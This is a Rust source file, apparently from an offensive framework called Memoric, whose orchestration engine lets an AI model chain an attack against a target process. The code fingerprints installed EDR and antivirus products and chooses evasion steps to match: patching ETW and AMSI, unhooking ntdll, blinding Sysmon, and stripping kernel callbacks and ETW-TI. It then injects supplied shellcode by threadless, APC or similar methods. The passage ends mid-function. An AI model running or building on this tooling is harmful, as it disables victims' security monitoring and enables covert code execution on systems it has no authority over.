//! Auto-orchestration engine
//! Chains EDR detection → adaptive evasion → injection → execution → cleanup
//! Provides intelligent, multi-step attack workflows controlled by the AI model.

use crate::error::MemoricError;
use serde::{Deserialize, Serialize};
use serde_json::{json, Value};
use std::path::Path;
use std::path::PathBuf;

pub const DEFAULT_ORCHESTRATION_PAGE_LIMIT: usize = 25;
pub const MAX_ORCHESTRATION_PAGE_LIMIT: usize = 100;
pub const MAX_PLAN_STEPS: usize = 64;
const AUTO_ORCHESTRATION_ARTIFACT_BYTES: usize = 128 * 1024;
const ORCHESTRATION_CURSOR_PREFIX: &str = "orchestration-cursor:";
pub const CHAIN_STATE_PATH_ENV: &str = "MEMORIC_CHAIN_STATE_PATH";
const CHAIN_STATE_VERSION: u32 = 1;

#[derive(Debug, Clone, Serialize, Deserialize)]
struct ChainStateFile {
    version: u32,
    generated_at: String,
    generated_at_epoch_secs: u64,
    chains: Vec<ChainExecutionState>,
}

#[derive(Debug, Clone, Serialize, Deserialize)]
struct ChainExecutionState {
    chain_id: String,
    status: String,
    created_at: String,
    updated_at: String,
    created_at_epoch_secs: u64,
    updated_at_epoch_secs: u64,
    task_id: Option<String>,
    target_pid: u32,
    threat_level: String,
    total_steps: usize,
    completed_steps: usize,
    failed_steps: usize,
    last_completed_step: Option<String>,
    next_step: Option<String>,
    plan_fingerprint: String,
    dag: Value,
    steps: Vec<ChainStepState>,
    resume: Value,
}

#[derive(Debug, Clone, Serialize, Deserialize)]
struct ChainStepState {
    id: String,
    order: usize,
    tool: String,
    action: String,
    required: bool,
    depends_on: Vec<String>,
    status: String,
    started_at: Option<String>,
    completed_at: Option<String>,
    error: Option<String>,
    rollback: Value,
    args_summary: Value,
    result_summary: Option<Value>,
}

#[derive(Debug, Clone)]
struct ResumeCheckpoint {
    chain_id: String,
    chain: ChainExecutionState,
    skip_completed_steps: bool,
    completed_step_ids: std::collections::BTreeSet<String>,
    public_json: Value,
}

/// Threat level detected on the target system
#[derive(Debug, Clone, Copy, PartialEq, Eq, PartialOrd, Ord)]
pub enum ThreatLevel {
    /// No EDR / minimal protection
    Low,
    /// Basic AV (Defender only)
    Medium,
    /// Full EDR suite (CrowdStrike, SentinelOne, etc.)
    High,
    /// Kernel-level telemetry (ETW-TI, sysmon, minifilters)
    Critical,
}

/// Recommended evasion profile based on threat assessment
#[derive(Debug, Clone)]
pub struct EvasionProfile {
    pub threat_level: ThreatLevel,
    pub detected_products: Vec<String>,
    pub recommended_evasion: Vec<EvasionStep>,
    pub recommended_injection: String,
    pub recommended_syscall_method: String,
    pub sleep_technique: String,
    pub needs_kernel_evasion: bool,
}

/// A single evasion step in the orchestrated chain
#[derive(Debug, Clone)]
pub struct EvasionStep {
    pub tool: String,
    pub action: String,
    pub args: Value,
    pub description: String,
    pub required: bool,
}

/// Known EDR/AV products and their detection capabilities
struct EdcProductDb;

impl EdcProductDb {
    fn classify(products: &[String]) -> ThreatLevel {
        let mut level = ThreatLevel::Low;

        for product in products {
            let lower = product.to_lowercase();
            if lower.contains("crowdstrike")
                || lower.contains("sentinelone")
                || lower.contains("carbon black")
                || lower.contains("cortex")
                || lower.contains("elastic edr")
                || lower.contains("trellix")
            {
                level = std::cmp::max(level, ThreatLevel::High);
            } else if lower.contains("defender")
                || lower.contains("sophos")
                || lower.contains("mcafee")
                || lower.contains("symantec")
                || lower.contains("kaspersky")
                || lower.contains("avast")
                || lower.contains("avg")
                || lower.contains("bitdefender")
            {
                level = std::cmp::max(level, ThreatLevel::Medium);
            }

            // Kernel-level indicators
            if lower.contains("sysmon")
                || lower.contains("etw")
                || lower.contains("minifilter")
                || lower.contains("patchguard")
            {
                level = ThreatLevel::Critical;
            }
        }

        level
    }

    fn evasion_for_level(level: ThreatLevel) -> (String, String, String) {
        match level {
            ThreatLevel::Low => (
                "thread".to_string(),      // injection method
                "direct".to_string(),      // syscall method
                "sleep_death".to_string(), // sleep technique
            ),
            ThreatLevel::Medium => (
                "apc".to_string(),
                "indirect".to_string(),
                "sleep_ekko".to_string(),
            ),
            ThreatLevel::High => (
                "threadless".to_string(),
                "indirect".to_string(),
                "sleep_foliage".to_string(),
            ),
            ThreatLevel::Critical => (
                "phantom".to_string(),
                "indirect".to_string(),
                "sleep_gargoyle".to_string(),
            ),
        }
    }
}

/// Assess the target system's security posture
pub fn assess_environment(args: &Value) -> Result<Value, MemoricError> {
    let pid = args.get("pid").and_then(|v| v.as_u64()).unwrap_or(0) as u32;

    tracing::info!(
        "[ORCHESTRATION] Assessing security environment (target PID={})",
        pid
    );

    let capability_matrix = crate::capability::matrix_json(args);
    // Detect security products via multiple methods
    let mut detected_products = Vec::new();
    let mut detection_methods: Vec<String> = Vec::new();
    let mut security_product_evidence = Vec::new();
    let mut environment_properties = Vec::new();

    environment_properties.push(assessment_evidence(
        "environment_property",
        "platform",
        "capability_matrix",
        0.95,
        json!({
            "supported": capability_matrix["platform"]["supported"].clone(),
            "os": capability_matrix["platform"]["os"].clone(),
            "arch": capability_matrix["platform"]["arch"].clone(),
            "message": capability_matrix["platform"]["message"].clone()
        }),
    ));
    environment_properties.push(assessment_evidence(
        "environment_property",
        "privilege",
        "capability_matrix",
        0.9,
        json!({
            "elevated": capability_matrix["privilege"]["elevated"].clone(),
            "debug_privilege_enabled": capability_matrix["privilege"]["debug"]["enabled"].clone()
        }),
    ));
    environment_properties.push(assessment_evidence(
        "environment_property",
        "driver_readiness",
        "capability_matrix",
        0.85,
        json!({
            "kernel_actions_ready": capability_matrix["driver"]["readiness"]["kernel_actions_ready"].clone(),
            "driver_load_possible": capability_matrix["driver"]["readiness"]["driver_load_possible"].clone(),
            "message": capability_matrix["driver"]["message"].clone()
        }),
    ));

    // Method 1: Process scan
    let processes = scan_running_processes()?;
    for (proc_name, proc_pid) in &processes {
        if is_security_product(proc_name) {
            detected_products.push(proc_name.clone());
            security_product_evidence.push(assessment_evidence(
                "security_product",
                proc_name,
                "process_scan",
                0.75,
                json!({
                    "process_name": proc_name,
                    "pid": proc_pid
                }),
            ));
        }
    }
    if !detected_products.is_empty() {
        detection_methods.push("process_scan".to_string());
    } else {
        environment_properties.push(assessment_evidence(
            "environment_property",
            "security_process_scan",
            "process_scan",
            0.65,
            json!({
                "processes_scanned": processes.len(),
                "known_security_processes_found": 0
            }),
        ));
    }

    // Method 2: Service scan
    let services = scan_security_services()?;
    for svc in &services {
        if !detected_products.contains(svc) {
            detected_products.push(svc.clone());
        }
        security_product_evidence.push(assessment_evidence(
            "security_product",
            svc,
            "service_scan",
            0.8,
            json!({
                "service_summary": svc
            }),
        ));
    }
    if !services.is_empty() {
        detection_methods.push("service_scan".to_string());
    } else {
        environment_properties.push(assessment_evidence(
            "environment_property",
            "security_service_scan",
            "service_scan",
            0.7,
            json!({
                "known_security_services_found": 0
            }),
        ));
    }

    // Method 3: Check for kernel-level telemetry indicators
    let mut kernel_indicators = Vec::new();
    if check_sysmon_present() {
        kernel_indicators.push("sysmon".to_string());
        detected_products.push("Sysmon".to_string());
        security_product_evidence.push(assessment_evidence(
            "security_product",
            "Sysmon",
            "kernel_check",
            0.9,
            json!({
                "indicator": "Sysmon service is running"
            }),
        ));
        environment_properties.push(assessment_evidence(
            "environment_property",
            "sysmon",
            "kernel_check",
            0.9,
            json!({
                "present": true
            }),
        ));
    }
    if check_etw_ti_enabled() {
        kernel_indicators.push("etw_ti".to_string());
        environment_properties.push(assessment_evidence(
            "environment_property",
            "etw_ti",
            "ntdll_export_heuristic",
            0.65,
            json!({
                "heuristic": "EtwEventWrite entrypoint appears patched or redirected"
            }),
        ));
    }
    if !kernel_indicators.is_empty() {
        detection_methods.push("kernel_check".to_string());
    }

    let threat_level = EdcProductDb::classify(&detected_products);
    let (injection, syscall, sleep) = EdcProductDb::evasion_for_level(threat_level);

    let needs_kernel = matches!(threat_level, ThreatLevel::Critical | ThreatLevel::High);
    let threat_level_evidence = assessment_evidence(
        "environment_property",
        "threat_level",
        "rule_based_classification",
        threat_confidence(
            threat_level,
            security_product_evidence.len(),
            kernel_indicators.len(),
        ),
        json!({
            "threat_level": format!("{:?}", threat_level),
            "detected_product_count": detected_products.len(),
            "kernel_indicators": kernel_indicators,
            "classification_rules": "known EDR process/service names and kernel telemetry indicators"
        }),
    );

    // Build the evasion plan
    let mut evasion_steps = Vec::new();

    // Always patch ETW as baseline
    evasion_steps.push(json!({
        "order": 1, "tool": "stealth", "action": "patch_etw",
        "description": "Patch EtwEventWrite to prevent ETW telemetry",
        "required": true
    }));

    if threat_level >= ThreatLevel::Medium {
        evasion_steps.push(json!({
            "order": 2, "tool": "stealth", "action": "patch_amsi",
            "description": "Patch AMSI to prevent script scanning",
            "required": true
        }));
        evasion_steps.push(json!({
            "order": 3, "tool": "stealth", "action": "unhook_ntdll",
            "description": "Unhook ntdll.dll by mapping clean copy from disk",
            "required": true
        }));
    }

    if threat_level >= ThreatLevel::High {
        evasion_steps.push(json!({
            "order": 4, "tool": "stealth", "action": "spoof_callstack",
            "description": "Spoof call stack before sleep to evade stack scanning",
            "required": true
        }));
        evasion_steps.push(json!({
            "order": 5, "tool": "stealth", "action": "hide_module",
            "description": "Unlink DLL from PEB to hide from module enumeration",
            "required": false
        }));
    }

    if needs_kernel {
        evasion_steps.push(json!({
            "order": 6, "tool": "kernel", "action": "etw_ti_remove",
            "description": "Remove ETW Threat Intelligence provider at kernel level",
            "required": true
        }));
        evasion_steps.push(json!({
            "order": 7, "tool": "kernel", "action": "object_callback_enum",
            "description": "Enumerate and neutralize ObRegisterCallbacks (EDR process protection)",
            "required": true
        }));
        if kernel_indicators
            .iter()
            .any(|indicator| indicator == "sysmon")
        {
            evasion_steps.push(json!({
                "order": 8, "tool": "stealth", "action": "sysmon_blind",
                "description": "Blind Sysmon driver to prevent event logging",
                "required": true
            }));
        }
    }

    // Injection step
    evasion_steps.push(json!({
        "order": 10, "tool": "inject",
        "action": injection,
        "args": { "syscall_method": syscall },
        "description": format!("Inject payload via {} with {} syscalls", injection, syscall),
        "required": true
    }));

    // Post-injection
    evasion_steps.push(json!({
        "order": 11, "tool": "stealth",
        "action": sleep,
        "description": format!("Sleep obfuscation via {}", sleep),
        "required": true
    }));

    Ok(json!({
        "success": true,
        "technique": "environment_assessment",
        "threat_level": format!("{:?}", threat_level),
        "detected_products": detected_products,
        "detection_methods": detection_methods,
        "kernel_indicators": threat_level_evidence["raw_evidence_summary"]["kernel_indicators"].clone(),
        "evidence": {
            "schema": "memoric.assessment.evidence.v1",
            "generated_at": crate::state::chrono_now_public(),
            "security_products": security_product_evidence,
            "environment_properties": environment_properties,
            "assessment_inputs": [
                threat_level_evidence
            ]
        },
        "profile": {
            "recommended_injection": injection,
            "recommended_syscall_method": syscall,
            "recommended_sleep": sleep,
            "needs_kernel_evasion": needs_kernel,
        },
        "evasion_plan": evasion_steps,
        "message": format!(
            "Threat level: {:?}. Detected {} security products. {} evasion steps recommended.",
            threat_level, detected_products.len(), evasion_steps.len()
        )
    }))
}

/// Execute a full orchestrated attack chain
pub fn execute_chain(args: &Value) -> Result<Value, MemoricError> {
    let runtime = crate::runtime::RuntimeContext::from_args(args).map_err(MemoricError::Other)?;
    let pid = args
        .get("pid")
        .and_then(|v| v.as_u64())
        .ok_or_else(|| MemoricError::MemoryAccess("Missing target pid".to_string()))?
        as u32;
    let shellcode_hex = args.get("shellcode").and_then(|v| v.as_str());
    let dry_run = args
        .get("dry_run")
        .and_then(|v| v.as_bool())
        .unwrap_or(true);
    let allow_live_execution = args
        .get("allow_live_execution")
        .and_then(|v| v.as_bool())
        .unwrap_or(false);

    tracing::warn!(
        "[ORCHESTRATION] Execute chain: PID={} dry_run={}",
        pid,
        dry_run
    );
    runtime.mark_running(
        None,
        format!("orchestration: assessing environment for pid {}", pid),
    );

    if !dry_run && !allow_live_execution {
        return Err(MemoricError::MemoryAccess(
            "orchestrate(action='execute', dry_run=false) requires allow_live_execution=true. The generated chain may run state-changing evasion and injection steps; run a dry run first and opt in explicitly.".to_string()
        ));
    }

    // Step 1: Assess environment
    let assessment = assess_environment(args)?;
    let threat_level = assessment
        .get("threat_level")
        .and_then(|v| v.as_str())
        .unwrap_or("Low");
    let plan = assessment
        .get("evasion_plan")
        .and_then(|v| v.as_array())
        .cloned()
        .unwrap_or_default();
    let total_steps = plan.len() as u64 + 1;
    runtime.update_progress(
        1,
        Some(total_steps),
        format!(
            "orchestration: assessment complete, {} planned steps",
            plan.len()
        ),
    );

    if dry_run {
        let dry_run_dag = orchestration_dag_preview(&plan);
        runtime.update_progress(
            total_steps,
            Some(total_steps),
            format!(
                "orchestration: dry-run plan complete, {} planned steps",
                plan.len()
            ),
        );
        let mut response = json!({
            "success": true,
            "technique": "orchestrated_chain",
            "mode": "dry_run",
            "target_pid": pid,
            "threat_level": threat_level,
            "planned_steps": plan.len(),
            "steps": plan,
            "dag": dry_run_dag,
            "message": format!("Dry run: {} steps planned for PID {} (threat: {}). Set dry_run=false to execute.",
                plan.len(), pid, threat_level)
        });
        apply_pagination_if_requested(&mut response, args, "execute-dry-run", &[("steps", &plan)])
            .map_err(MemoricError::Other)?;
        return Ok(response);
    }

    let mut results = Vec::new();
    let mut failures = Vec::new();
    let execution_dag = orchestration_dag_preview(&plan);
    let resume_checkpoint = resume_checkpoint_from_args(args, pid, &plan, &execution_dag)?;
    let chain_id = resume_checkpoint
        .as_ref()
        .map(|checkpoint| checkpoint.chain_id.clone())
        .unwrap_or_else(|| format!("chain_{}", chrono::Utc::now().timestamp_millis()));
    let skip_completed_steps = resume_checkpoint
        .as_ref()
        .map(|checkpoint| checkpoint.skip_completed_steps)
        .unwrap_or(false);
    let completed_checkpoint_steps = resume_checkpoint
        .as_ref()
        .map(|checkpoint| checkpoint.completed_step_ids.clone())
        .unwrap_or_default();
    let mut chain_state = resume_checkpoint
        .as_ref()
        .map(|checkpoint| checkpoint.chain.clone())
        .unwrap_or_else(|| {
            create_chain_state(&chain_id, args, pid, threat_level, &plan, &execution_dag)
        });
    refresh_chain_state(
        &mut chain_state,
        "working",
        Some(crate::state::chrono_now_public()),
        current_epoch_secs(),
    );
    persist_chain_state(&chain_state);
    let mut executed_steps = Vec::new();
    let mut skipped_checkpoint_steps = Vec::new();
    let mut planner_skipped_steps = Vec::new();
    let live_capability_matrix = crate::capability::matrix_json(args);
    let mut rollback_report = json!({
        "triggered": false,
        "reason": "not_needed",
        "steps": [],
        "summary": "No rollback was needed."
    });

    for (step_index, step) in plan.iter().enumerate() {
        runtime.check().map_err(MemoricError::Other)?;
        let tool = step.get("tool").and_then(|v| v.as_str()).unwrap_or("");
        let action = step.get("action").and_then(|v| v.as_str()).unwrap_or("");
        let required = step
            .get("required")
            .and_then(|v| v.as_bool())
            .unwrap_or(false);
        let progress_before = step_index as u64 + 1;
        let progress_after = step_index as u64 + 2;
        let step_id = orchestration_step_id(step, step_index + 1);

        if skip_completed_steps && completed_checkpoint_steps.contains(&step_id) {
            let skipped_entry = json!({
                "id": step_id,
                "tool": tool,
                "action": action,
                "order": step_index + 1,
                "required": required,
                "depends_on": step["depends_on"].clone(),
                "success": true,
                "skipped": true,
                "resume_checkpoint": true,
                "message": "Step was already completed in the persisted chain checkpoint"
            });
            skipped_checkpoint_steps.push(skipped_entry.clone());
            results.push(skipped_entry);
            runtime.update_progress(
                progress_after,
                Some(total_steps),
                format!(
                    "orchestration: skipped checkpoint-completed step {}/{} {}(action='{}')",
                    step_index + 1,
                    plan.len(),
                    tool,
                    action
                ),
            );
            continue;
        }

        tracing::info!("[ORCHESTRATION] Step: {}/{}", tool, action);
        mark_chain_step_running(&mut chain_state, &step_id);
        persist_chain_state(&chain_state);
        runtime.update_progress(
            progress_before,
            Some(total_steps),
            format!(
                "orchestration: running step {}/{} {}(action='{}')",
                step_index + 1,
                plan.len(),
                tool,
                action
            ),
        );

        let step_args_raw = step.get("args").cloned().unwrap_or(json!({}));
        let mut step_args = if let Some(obj) = step_args_raw.as_object() {
            let mut map = serde_json::Map::new();
            map.insert("action".to_string(), json!(action));
            map.insert("pid".to_string(), json!(pid));
            for (k, v) in obj {
                if k != "action" && k != "pid" {
                    map.insert(k.clone(), v.clone());
                }
            }
            if let Some(task_id) = args.get("task_id") {
                map.insert("task_id".to_string(), task_id.clone());
            }
            if let Some(timeout_ms) = args.get("timeout_ms") {
                map.insert("timeout_ms".to_string(), timeout_ms.clone());
            }
            json!(map)
        } else {
            let mut map = serde_json::Map::new();
            map.insert("action".to_string(), json!(action));
            map.insert("pid".to_string(), json!(pid));
            if let Some(task_id) = args.get("task_id") {
                map.insert("task_id".to_string(), task_id.clone());
            }
            if let Some(timeout_ms) = args.get("timeout_ms") {
                map.insert("timeout_ms".to_string(), timeout_ms.clone());
            }
            Value::Object(map)
        };

        // Forward shellcode to the injection step
        if tool == "inject" {
            if let Some(sc) = shellcode_hex {
                step_args["shellcode"] = json!(sc);
            }
        }

        let mut live_planner = planner_decision(tool, action, &step_args, &live_capability_matrix);
        if !live_planner["include_in_effective_plan"]
            .as_bool()
            .unwrap_or(false)
        {
            let skip_reason = live_planner["skip_reason"]
                .as_str()
                .unwrap_or("blocked by live planner")
                .to_string();
            let skipped_entry = json!({
                "id": step_id,
                "tool": tool,
                "action": action,
                "order": step_index + 1,
                "required": required,
                "depends_on": step["depends_on"].clone(),
                "success": false,
                "skipped": true,
                "planner": live_planner,
                "error": skip_reason,
                "message": "Step was blocked by live capability-aware planner before dispatch"
            });
            mark_chain_step_failed(&mut chain_state, &step_id, &skip_reason);
            persist_chain_state(&chain_state);
            runtime.update_progress(
                progress_after,
                Some(total_steps),
                format!(
                    "orchestration: planner blocked step {}/{} {}(action='{}')",
                    step_index + 1,
                    plan.len(),
                    tool,
                    action
                ),
            );
            if required {
                failures.push(skipped_entry.clone());
                results.push(skipped_entry);
                rollback_report = execute_dependency_aware_rollback(
                    &executed_steps,
                    &execution_dag,
                    &chain_id,
                    args,
                );
                break;
            }
            planner_skipped_steps.push(skipped_entry.clone());
            results.push(skipped_entry);
            continue;
        }

        if let Err(selection_error) =
            apply_live_planner_selection(tool, action, &mut step_args, &mut live_planner)
        {
            let skipped_entry = json!({
                "id": step_id,
                "tool": tool,
                "action": action,
                "order": step_index + 1,
                "required": required,
                "depends_on": step["depends_on"].clone(),
                "success": false,
                "skipped": true,
                "planner": live_planner,
                "error": selection_error,
                "message": "Step was blocked by live capability-aware method selection before dispatch"
            });
            mark_chain_step_failed(&mut chain_state, &step_id, &selection_error);
            persist_chain_state(&chain_state);
            runtime.update_progress(
                progress_after,
                Some(total_steps),
                format!(
                    "orchestration: capability selection blocked step {}/{} {}(action='{}')",
                    step_index + 1,
                    plan.len(),
                    tool,
                    action
                ),
            );
            if required {
                failures.push(skipped_entry.clone());
                results.push(skipped_entry);
                rollback_report = execute_dependency_aware_rollback(
                    &executed_steps,
                    &execution_dag,
                    &chain_id,
                    args,
                );
                break;
            }
            planner_skipped_steps.push(skipped_entry.clone());
            results.push(skipped_entry);
            continue;
        }

        let rollback = orchestration_rollback_metadata(tool, action, &step_args, step);
        let result = crate::mcp::tool_call::call_tool(tool, step_args);

        match result {
            Ok(val) => {
                crate::observability::link_task(
                    args.get("task_id")
                        .and_then(|value| value.as_str())
                        .unwrap_or(&chain_id),
                    &chain_id,
                );
                let executed_entry = json!({
                    "id": step_id,
                    "tool": tool,
                    "action": action,
                    "order": step_index + 1,
                    "required": required,
                    "depends_on": step["depends_on"].clone(),
                    "rollback": rollback,
                    "planner": live_planner,
                    "success": true,
                    "result": val
                });
                mark_chain_step_completed(&mut chain_state, &step_id, &val);
                persist_chain_state(&chain_state);
                executed_steps.push(executed_entry.clone());
                results.push(executed_entry);
                runtime.update_progress(
                    progress_after,
                    Some(total_steps),
                    format!(
                        "orchestration: completed step {}/{} {}(action='{}')",
                        step_index + 1,
                        plan.len(),
                        tool,
                        action
                    ),
                );
            }
            Err(e) => {
                let error_text = e.to_string();
                let entry = json!({
                    "id": step_id,
                    "tool": tool,
                    "action": action,
                    "success": false,
                    "error": error_text
                });
                mark_chain_step_failed(&mut chain_state, &step_id, &error_text);
                persist_chain_state(&chain_state);
                runtime.update_progress(
                    progress_after,
                    Some(total_steps),
                    format!(
                        "orchestration: step {}/{} {}(action='{}') failed",
                        step_index + 1,
                        plan.len(),
                        tool,
                        action
                    ),
                );
                if required {
                    failures.push(entry.clone());
                    results.push(entry);
                    tracing::error!(
                        "[ORCHESTRATION] Required step failed: {}/{}: {}",
                        tool,
                        action,
                        error_text
                    );
                    rollback_report = execute_dependency_aware_rollback(
                        &executed_steps,
                        &execution_dag,
                        &chain_id,
                        args,
                    );
                    break; // Stop on required step failure
                } else {
                    results.push(entry);
                    tracing::warn!(
                        "[ORCHESTRATION] Optional step failed: {}/{}: {}",
                        tool,
                        action,
                        error_text
                    );
                }
            }
        }
    }
    mark_chain_finished(&mut chain_state, failures.is_empty());
    persist_chain_state(&chain_state);

    let mut response = json!({
        "success": failures.is_empty(),
        "technique": "orchestrated_chain",
        "chain_id": chain_id,
        "target_pid": pid,
        "threat_level": threat_level,
        "steps_planned": plan.len(),
        "steps_executed": executed_steps.len(),
        "steps_skipped_from_checkpoint": skipped_checkpoint_steps.len(),
        "steps_skipped_by_planner": planner_skipped_steps.len(),
        "steps_failed": failures.len(),
        "results": results,
        "failures": failures,
        "resume_checkpoint": resume_checkpoint
            .as_ref()
            .map(|checkpoint| checkpoint.public_json.clone())
            .unwrap_or_else(|| json!(null)),
        "skipped_checkpoint_steps": skipped_checkpoint_steps,
        "planner_skipped_steps": planner_skipped_steps,
        "live_planner": {
            "capability_summary": planner_capability_summary(&live_capability_matrix),
            "selection_rule": "live execution reuses planner_decision before dispatch; optional blocked steps are skipped and required blocked steps halt the chain with rollback"
        },
        "dag": execution_dag,
        "checkpoint": chain_state_public_json(&chain_state),
        "rollback": rollback_report,
        "message": if failures.is_empty() {
            format!("Chain completed: {}/{} steps succeeded", results.len(), plan.len())
        } else {
            format!("Chain halted: {} required steps failed", failures.len())
        }
    });
    let output_path = output_path_from_args(args);
    let orchestration_artifact = if let Some(path) = output_path {
        let correlation_id = crate::observability::correlation_id_from_args(args);
        let payload_bytes = serde_json::to_vec_pretty(&json!({
            "results": results,
            "failures": failures,
            "chain_id": chain_id,
            "target_pid": pid,
            "threat_level": threat_level,
            "rollback": rollback_report,
        }))
        .map_err(|e| MemoricError::Other(format!("serialize orchestration artifact: {}", e)))?;
        Some(
            crate::artifact::write_artifact_bytes(
                &path,
                &payload_bytes,
                crate::artifact::retention_secs_from_args(args),
                correlation_id.as_deref(),
            )
            .map_err(MemoricError::Other)?,
        )
    } else {
        None
    };
    if let Some(artifact) = orchestration_artifact {
        response["artifact"] = artifact.clone();
        response["artifact_path"] = json!(artifact["path"].as_str().unwrap_or_default());
        response["redaction_status"] = json!("artifact");
    }
    apply_pagination_if_requested(
        &mut response,
        args,
        "execute-results",
        &[("results", &results), ("failures", &failures)],
    )
    .map_err(MemoricError::Other)?;
    Ok(response)
}

/// Generate a custom chain from a chain specification
pub fn plan_chain(args: &Value) -> Result<Value, MemoricError> {
    let template = args.get("template").and_then(|v| v.as_str());
    let steps_opt = args.get("steps").and_then(|v| v.as_array());
    let generated_steps_result = template
        .filter(|_| steps_opt.is_none())
        .map(|template_id| crate::orchestration::templates::plan_steps(template_id, args));
    let empty_steps = Vec::new();
    let generated_steps = generated_steps_result
        .as_ref()
        .and_then(|result| result.as_ref().ok());
    let steps = if let Some(steps) = steps_opt {
        steps
    } else if let Some(steps) = generated_steps {
        steps
    } else {
        &empty_steps
    };

    let mut plan = Vec::new();
    let mut validation_errors = Vec::new();
    let mut validation_warnings = Vec::new();
    let capability_matrix = crate::capability::matrix_json(args);
    let mut previous_step_id: Option<String> = None;
    let mut has_explicit_dependencies = false;

    if steps_opt.is_none() && template.is_none() {
        validation_errors.push(
            "Missing steps array. orchestrate(action='plan') performs static validation only; provide steps=[{tool, action, args}] or template='<id>' from orchestrate(action='templates').".to_string(),
        );
    }
    if let Some(Err(error)) = &generated_steps_result {
        validation_errors.push(error.clone());
    }

    if steps.len() > MAX_PLAN_STEPS {
        validation_errors.push(format!(
            "Plan has {} steps; maximum supported static validation size is {}",
            steps.len(),
            MAX_PLAN_STEPS
        ));
    }

    for (i, step) in steps.iter().take(MAX_PLAN_STEPS).enumerate() {
        if !step.is_object() {
            validation_errors.push(format!("Step {}: expected an object", i + 1));
            continue;
        }

        let tool = step
            .get("tool")
            .and_then(|v| v.as_str())
            .unwrap_or("unknown");
        let action = step
            .get("action")
            .and_then(|v| v.as_str())
            .unwrap_or("unknown");

        if !is_valid_tool(tool) {
            validation_errors.push(format!("Step {}: unknown tool '{}'", i + 1, tool));
            continue;
        }
        if !crate::mcp::action_registry::is_known_tool_action(tool, action) {
            validation_errors.push(format!(
                "Step {}: unknown action '{}' for tool '{}'",
                i + 1,
                action,
                tool
            ));
            continue;
        }

        let step_args = step.get("args").cloned().unwrap_or(json!({}));
        let missing = missing_required_static_params(tool, action, &step_args);
        if !missing.is_empty() {
            validation_errors.push(format!(
                "Step {}: {}/{} missing required parameter(s): {}",
                i + 1,
                tool,
                action,
                missing.join(", ")
            ));
        }
        validation_errors.extend(
            static_plan_registry_validation_errors(tool, action, &step_args)
                .into_iter()
                .map(|error| format!("Step {}: {}", i + 1, error)),
        );
        validation_warnings.extend(
            static_plan_warnings(tool, action, &step_args)
                .into_iter()
                .map(|warning| format!("Step {}: {}", i + 1, warning)),
        );

        let planner = planner_decision(tool, action, &step_args, &capability_matrix);
        let step_id = orchestration_step_id(step, i + 1);
        let explicit_dependencies = has_explicit_dependency_spec(step);
        has_explicit_dependencies |= explicit_dependencies;
        let depends_on = orchestration_step_dependencies(step, previous_step_id.as_deref());
        let dependency_mode = if explicit_dependencies {
            "explicit"
        } else {
            "implicit_order"
        };
        let preconditions = orchestration_preconditions(step, &planner, &missing);
        let rollback = orchestration_rollback_metadata(tool, action, &step_args, step);

        let planned_step = json!({
            "id": step_id,
            "order": i + 1,
            "tool": tool,
            "action": action,
            "args": step_args,
            "description": step.get("description").and_then(|v| v.as_str()).unwrap_or(""),
            "required": step.get("required").and_then(|v| v.as_bool()).unwrap_or(true),
            "depends_on": depends_on,
            "dependency_mode": dependency_mode,
            "preconditions": preconditions,
            "rollback": rollback,
            "planner": planner,
        });

        previous_step_id = Some(step_id);
        plan.push(planned_step);
    }

    let dag = apply_dag_planning(
        &mut plan,
        if has_explicit_dependencies {
            "explicit"
        } else {
            "implicit_linear_compat"
        },
        &mut validation_errors,
        &mut validation_warnings,
    );
    let effective_plan = plan
        .iter()
        .filter(|step| {
            step["planner"]["include_in_effective_plan"]
                .as_bool()
                .unwrap_or(false)
        })
        .cloned()
        .collect::<Vec<_>>();
    let blocked_steps = plan
        .iter()
        .filter(|step| {
            !step["planner"]["include_in_effective_plan"]
                .as_bool()
                .unwrap_or(false)
        })
        .cloned()
        .collect::<Vec<_>>();

    let mut response = json!({
        "success": validation_errors.is_empty(),
        "technique": "plan_chain",
        "mode": "static_validation_only",
        "executes_live_actions": false,
        "template": template,
        "steps": plan.len(),
        "effective_steps": effective_plan.len(),
        "plan": plan,
        "effective_plan": effective_plan,
        "blocked_steps": blocked_steps,
        "dag": dag,
        "policy_planner": {
            "configured_policy": crate::policy::configured_level().as_str(),
            "capability_summary": planner_capability_summary(&capability_matrix),
            "selection_rule": "effective_plan includes only DAG nodes allowed by policy/capabilities whose required dependencies are satisfied; static validation errors are reported separately",
        },
        "validation_errors": validation_errors,
        "validation_warnings": validation_warnings,
        "message": if validation_errors.is_empty() {
            format!("Chain plan validated: {} effective steps, {} blocked by planner", effective_plan.len(), blocked_steps.len())
        } else {
            format!("Plan has {} validation errors", validation_errors.len())
        }
    });
    if let Some(artifact) = export_orchestration_plan_artifact(
        args,
        template,
        &plan,
        &effective_plan,
        &blocked_steps,
        &dag,
        &response,
    )? {
        response["artifact"] = artifact.clone();
        response["artifact_path"] = json!(artifact["path"].as_str().unwrap_or_default());
        response["output_path"] = json!(artifact["path"].as_str().unwrap_or_default());
        response["redaction_status"] = json!("artifact");
        response["exported_count"] = json!(plan.len());
        response["export_reason"] = json!(if output_path_from_args(args).is_some() {
            "explicit_output_path"
        } else {
            "large_plan_auto"
        });
    }
    apply_pagination_if_requested(
        &mut response,
        args,
        "plan",
        &[
            ("plan", &plan),
            ("effective_plan", &effective_plan),
            ("blocked_steps", &blocked_steps),
        ],
    )
    .map_err(MemoricError::Other)?;
    Ok(response)
}

// ─── Helpers ──────────────────────────────────────────────────

fn export_orchestration_plan_artifact(
    args: &Value,
    template: Option<&str>,
    plan: &[Value],
    effective_plan: &[Value],
    blocked_steps: &[Value],
    dag: &Value,
    response: &Value,
) -> Result<Option<Value>, MemoricError> {
    let payload = json!({
        "kind": "orchestration-plan",
        "template": template,
        "generated_at": crate::state::chrono_now_public(),
        "steps": plan.len(),
        "effective_steps": effective_plan.len(),
        "blocked_steps_count": blocked_steps.len(),
        "plan": plan,
        "effective_plan": effective_plan,
        "blocked_steps": blocked_steps,
        "dag": dag,
        "policy_planner": response["policy_planner"].clone(),
        "validation_errors": response["validation_errors"].clone(),
        "validation_warnings": response["validation_warnings"].clone(),
        "redaction_status": "artifact"
    });
    let bytes = serde_json::to_vec_pretty(&payload).map_err(|e| {
        MemoricError::Other(format!("serialize orchestration plan artifact: {}", e))
    })?;
    let explicit_path = output_path_from_args(args);
    if explicit_path.is_none() && bytes.len() <= AUTO_ORCHESTRATION_ARTIFACT_BYTES {
        return Ok(None);
    }

    let path =
        explicit_path.unwrap_or_else(|| auto_orchestration_plan_output_path(template, &bytes));
    let correlation_id = crate::observability::correlation_id_from_args(args);
    crate::artifact::write_artifact_bytes(
        &path,
        &bytes,
